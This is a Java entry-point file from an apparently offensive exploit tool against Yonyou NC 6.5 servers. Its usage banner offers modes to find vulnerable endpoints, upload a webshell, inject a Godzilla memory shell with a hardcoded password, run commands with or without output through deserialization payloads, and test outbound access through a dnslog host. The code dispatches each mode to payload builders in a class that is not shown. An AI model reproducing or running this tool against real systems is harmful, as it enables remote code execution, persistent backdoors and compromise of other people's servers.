package com.droplab.Utils;

import com.droplab.Controller.Yongyou.YongyouController;


public class TestUtils {

    public static void main(String[] args) throws Exception {
        if(args.length < 2){
            System.out.println("######## ##     ##    ###    ##    ##  ######    ######     ###    ##    ##    ##        #######  ##     ## ########    ##       ####  ######  #### ");
            System.out.println("     ##  ##     ##   ## ##   ###   ## ##    ##  ##    ##   ## ##   ###   ##    ##       ##     ## ##     ## ##          ##        ##  ##    ##  ##  ");
            System.out.println("    ##   ##     ##  ##   ##  ####  ## ##        ##        ##   ##  ####  ##    ##       ##     ## ##     ## ##          ##        ##  ##        ##  ");
            System.out.println("   ##    ######### ##     ## ## ## ## ##   ####  ######  ##     ## ## ## ##    ##       ##     ## ##     ## ######      ##        ##   ######   ##  ");
            System.out.println("  ##     ##     ## ######### ##  #### ##    ##        ## ######### ##  ####    ##       ##     ##  ##   ##  ##          ##        ##        ##  ##  ");
            System.out.println(" ##      ##     ## ##     ## ##   ### ##    ##  ##    ## ##     ## ##   ###    ##       ##     ##   ## ##   ##          ##        ##  ##    ##  ##  ");
            System.out.println("######## ##     ## ##     ## ##    ##  ######    ######  ##     ## ##    ##    ########  #######     ###    ########    ######## ####  ######  #### ");
            System.out.println("by 会上树的猪");
            System.out.println("检查存在的接口：java -jar nc6.5.jar http://127.0.0.1 Check");
            System.out.println("落地webshell：java -jar nc6.5.jar http://127.0.0.1 UploadShell C:/temp/1.jsp");
            System.out.println("注入内存马：java -jar nc6.5.jar http://127.0.0.1 MemoryShell");
            System.out.println("回显命令执行(Testdmc)：java -jar nc6.5.jar http://127.0.0.1 Execute");
            System.out.println("无回显命令执行：java -jar nc6.5.jar http://127.0.0.1 blind whoami");
            System.out.println("URLDNS构造链：java -jar nc6.5.jar http://127.0.0.1 urldns http://123.dnglog.cn");
            System.exit(0);
        }
        YongyouController yongyouController = new YongyouController();
        String encode=null;
        switch (args[1]){
            case "Check":
                encode = yongyouController.YongyouCheckURL(args[0], "");
                break;
            case "Execute":
                encode = yongyouController.GetUnserializePayload("Execute",
                        "",
                        "Tomcat", "", "", "", "");
                break;
            case "MemoryShell":
                encode = yongyouController.GetUnserializePayload("MemoryShell",
                        "",
                        "Tomcat", "Valve", "", "Godzilla", "qax36oNb");
                break;

            case "blind":  //无回显命令执行
                 encode = yongyouController.blind(args[2]);
                 break;
            case "urldns":  //urldns构造链检测是否出网
                encode = yongyouController.urldns(args[2]);
                break;
            case "UploadShell":
            default:
                encode = yongyouController.GetUnserializePayload("UploadShell",
                        args[2],
                        "Tomcat", "", "", "", "");
                break;
        }
        System.out.println(encode.replaceAll("\r\n",""));
    }
}
